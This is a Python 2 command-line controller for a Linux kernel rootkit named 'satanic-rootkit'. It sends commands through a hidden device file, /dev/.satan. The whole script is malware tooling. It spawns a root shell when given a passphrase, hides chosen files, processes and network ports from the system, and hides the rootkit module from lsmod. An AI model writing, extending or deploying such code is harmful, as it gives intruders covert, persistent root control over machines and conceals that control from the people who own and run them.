#!/usr/bin/env python2

import os
import sys

cdev = '/dev/.satan'


def usage():
    return "usage: " + sys.argv[0] + " <command> [argument]\n\n" \
        "--privesc <passphrase>     -- Spawn a root shell (bash).\n" \
        "--file-hide <path>         -- File/directory hiding by absolute path.\n" \
        "--file-unhide <path>       -- File/directory unhiding by absolute path.\n" \
        "--proc-hide <pid>          -- Process hiding by PID.\n" \
        "--proc-unhide <pid>        -- Process unhiding by PID.\n" \
        "--port-hide <port>         -- Port hiding by port number.\n" \
        "--port-unhide <port>       -- Port unhiding by port number.\n" \
        "--mod-hide                 -- Module hiding (hide itself from lsmod).\n" \
        "--mod-unhide               -- Module unhiding (unhide itself from lsmod).\n" \
        "\n" \
        "-h --help                  -- Help message.\n" \
        "-v --version               -- Version info." \

def version():
    return "satanic-rootkit 0.1\n" \
        "Licensed under GPL-2.0. Developed by Marco Wang."

def has_n_args_or_die(min_num):
    if len(sys.argv) < min_num:
        print('error: insufficient arguments\n')
        print(usage())
        sys.exit(1)



if __name__ == '__main__':
    if len(sys.argv) <= 1:
        print(usage())


    elif sys.argv[1] in ['--privesc']:
        has_n_args_or_die(3)
        command = 'privesc ' + sys.argv[2]
        payload = 'echo \'{}\' > {}'.format(command, cdev)
        with open('.payload', 'w') as f:
            f.write(payload)
        os.system('/usr/bin/env bash --init-file .payload')


    elif sys.argv[1] in ['--file-hide']:
        has_n_args_or_die(3)
        with open(cdev, 'w') as f:
            f.write('file_hide {}'.format(sys.argv[2]))


    elif sys.argv[1] in ['--file-unhide']:
        has_n_args_or_die(3)
        with open(cdev, 'w') as f:
            f.write('file_unhide {}'.format(sys.argv[2]))


    elif sys.argv[1] in ['--proc-hide']:
        has_n_args_or_die(3)
        with open(cdev, 'w') as f:
            f.write('proc_hide {}'.format(sys.argv[2]))


    elif sys.argv[1] in ['--proc-unhide']:
        has_n_args_or_die(3)
        with open(cdev, 'w') as f:
            f.write('proc_unhide {}'.format(sys.argv[2]))


    elif sys.argv[1] in ['--port-hide']:
        has_n_args_or_die(3)
        with open(cdev, 'w') as f:
            f.write('port_hide {}'.format(sys.argv[2]))


    elif sys.argv[1] in ['--port-unhide']:
        has_n_args_or_die(3)
        with open(cdev, 'w') as f:
            f.write('port_unhide {}'.format(sys.argv[2]))


    elif sys.argv[1] in ['--mod-hide']:
        with open(cdev, 'w') as f:
            f.write('mod_hide')


    elif sys.argv[1] in ['--mod-unhide']:
        with open(cdev, 'w') as f:
            f.write('mod_unhide')


    elif sys.argv[1] in ['-h', '--help']:
        print(usage())


    elif sys.argv[1] in ['-v', '--version']:
        print(version())


    else:
        print('error: unknown command')
